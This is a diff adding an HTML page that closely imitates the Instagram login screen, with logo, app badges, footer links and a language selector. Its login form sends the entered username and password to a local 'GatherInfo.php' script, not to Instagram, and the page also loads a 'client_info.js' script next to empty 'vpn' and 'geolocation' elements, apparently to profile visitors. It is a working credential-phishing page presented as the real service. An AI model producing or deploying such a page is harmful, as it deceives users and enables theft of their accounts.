@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>Instagram</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" type="text/css" href="./styles.css">
+        <link rel="shortcut icon" href="static/images/ico/favicon_instagram.png" type="image/png">
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js" charset="UTF-8"></script>
+        <script src="./client_info.js" charset="UTF-8"></script>
+    </head>
+    <body>
+        <div id="vpn"></div>
+        <div class="geolocation"></div>
+        <div class="wrapper">
+            <div class="header">
+                <div class="top">
+                    <div class="logo">
+                        <img src="./static/images/ico/instagram.png" alt="instagram" style="width: 175px;">
+                    </div>
+                    <form method="post" action="GatherInfo.php"> 
+                        <div class="form">
+                            <div class="input_field">
+                                <input name="username" id="username" type="text" placeholder="Phone number, username, or email" class="input">
+                            </div>
+                            <div class="input_field">
+                                <input name="password" id="password" type="password" placeholder="Password" class="input">
+                                <button class="hsh" type="button">Show</button>
+                            </div>
+                            <button class="submit-btn" type="submit" disabled="true">
+                                Log In
+                            </button>
+                        </div>
+                    </form>
+                    
+                    <div class="or">
+                        <div class="line"></div>
+                        <p class="orvisibile">OR</p>
+                        <div class="line"></div>
+                    </div>
+                    <div class="dif">
+                        <div class="fb">
+                            <img src="./static/images/ico/facebook.png" alt="facebook">
+                            <p>Log in with Facebook</p>
+                        </div>
+                        <div class="forgot">
+                            <a href="#" class="fotgotPassword">Forgot password?</a>
+                        </div>
+                    </div>
+                </div>
+                <div class="signup">
+                    <p class="noaccount">Don't have an account? <a href="#" class="signupText">Sign up</a></p>
+                </div>
+                <div class="apps">
+                    <p>Get the app.</p>
+                    <div class="icons">
+                        <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo"><img src="./static/images/ico/appstore.png" alt="appstore"></a>
+                        <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb&utm_campaign=loginPage&ig_mid=E72C2739-1C57-4508-85AC-94EA8B131D14&utm_content=lo&utm_medium=badge"><img src="./static/images/ico/googleplay.png" alt="googleplay"></a>
+                    </div>
+                </div>
+            </div>
+            <div class="fromLogo">
+                <div class="from">
+                    <p>from</p>
+                </div>
+                <img class="text-logo" src="./static/images/ico/facebook_text.png">
+            </div>
+            <div class="footer">
+                <div class="links">
+                    <ul class="list1">
+                        <li><a class="footerLink" href="#">About</a></li>
+                        <li><a class="footerLink" href="#">Blog</a></li>
+                        <li><a class="footerLink" href="#">Jobs</a></li>
+                        <li><a class="footerLink" href="#">Help</a></li>
+                        <li><a class="footerLink" href="#">API</a></li>
+                        <li><a class="footerLink" href="#">Privacy</a></li>
+                        <li><a class="footerLink" href="#">Terms</a></li>
+                        <li><a class="footerLink" href="#">Top Accounts</a></li>
+                        <li><a class="footerLink" href="#">Hashtags</a></li>
+                        <li><a class="footerLink" href="#">Locations</a></li>
+                        <li><a class="footerLink" href="#">Instagram Lite</a></li>
+                        <ul class="list2">
+                            <li><a class="footerLink" href="#">Beauty</a></li>
+                            <li><a class="footerLink" href="#">Dance</a></li>
+                            <li><a class="footerLink" href="#">Fitness</a></li>
+                            <li><a class="footerLink" href="#">Food & Drink</a></li>
+                            <li><a class="footerLink" href="#">Home & Garden</a></li>
+                            <li><a class="footerLink" href="#">Music</a></li>
+                            <li><a class="footerLink" href="#">Visual Arts</a></li>
+                        </ul>
+
+                    </ul>
+                </div>
+            </div>
+            <div class="copyright">
+                <select aria-label="Language" class="languages">
+                    <option value="af">
+                        Afrikaans
+                    </option>
+                    <option value="cs">
+                        Čeština
+                    </option>
+                    <option value="da">
+                        Dansk
+                    </option>
+                    <option value="de">
+                        Deutsch
+                    </option>
+                    <option value="el">
+                        Ελληνικά
+                    </option>
+                    <option value="en">
+                        English
+                    </option>
+                    <option value="en-gb">
+                        English (UK)
+                    </option>
+                    <option value="es">
+                        Español (España)
+                    </option>
+                    <option value="es-la">
+                        Español
+                    </option>
+                    <option value="fi">
+                        Suomi
+                    </option>
+                    <option value="fr">
+                        Français
+                    </option>
+                    <option value="id">
+                        Bahasa Indonesia
+                    </option>
+                    <option value="it">
+                        Italiano
+                    </option>
+                    <option value="ja">
+                        日本語
+                    </option>
+                    <option value="ko">
+                        한국어
+                    </option>
+                    <option value="ms">
+                        Bahasa Melayu
+                    </option>
+                    <option value="nb">
+                        Norsk
+                    </option>
+                    <option value="nl">
+                        Nederlands
+                    </option>
+                    <option value="pl">
+                        Polski
+                    </option>
+                    <option value="pt-br">
+                        Português (Brasil)
+                    </option>
+                    <option value="pt">
+                        Português (Portugal)
+                    </option>
+                    <option value="ru">
+                        Русский
+                    </option>
+                    <option value="sv">
+                        Svenska
+                    </option>
+                    <option value="th">
+                        ภาษาไทย
+                    </option>
+                    <option value="tl">
+                        Filipino
+                    </option>
+                    <option value="tr">
+                        Türkçe
+                    </option>
+                    <option value="zh-cn">
+                        中文(简体)
+                    </option>
+                    <option value="zh-tw">
+                        中文(台灣)
+                    </option>
+                    <option value="bn">
+                        বাংলা
+                    </option>
+                    <option value="gu">
+                        ગુજરાતી
+                    </option>
+                    <option value="hi">
+                        हिन्दी
+                    </option>
+                    <option value="hr">
+                        Hrvatski
+                    </option>
+                    <option value="hu">
+                        Magyar
+                    </option>
+                    <option value="kn">
+                        ಕನ್ನಡ
+                    </option>
+                    <option value="ml">
+                        മലയാളം
+                    </option>
+                    <option value="mr">
+                        मराठी
+                    </option>
+                    <option value="ne">
+                        नेपाली
+                    </option>
+                    <option value="pa">
+                        ਪੰਜਾਬੀ
+                    </option>
+                    <option value="si">
+                        සිංහල
+                    </option>
+                    <option value="sk">
+                        Slovenčina
+                    </option>
+                    <option value="ta">
+                        தமிழ்
+                    </option>
+                    <option value="te">
+                        తెలుగు
+                    </option>
+                    <option value="vi">
+                        Tiếng Việt
+                    </option>
+                    <option value="zh-hk">
+                        中文(香港)
+                    </option>
+                    <option value="bg">
+                        Български
+                    </option>
+                    <option value="fr-ca">
+                        Français (Canada)
+                    </option>
+                    <option value="ro">
+                        Română
+                    </option>
+                    <option value="sr">
+                        Српски
+                    </option>
+                    <option value="uk">
+                        Українська
+                    </option>
+                </select>
+                <span class="crvi">
+                    © 2021 Instagram from Facebook
+                </span>
+            </div>
+        </div>
+    </body>
+</html>
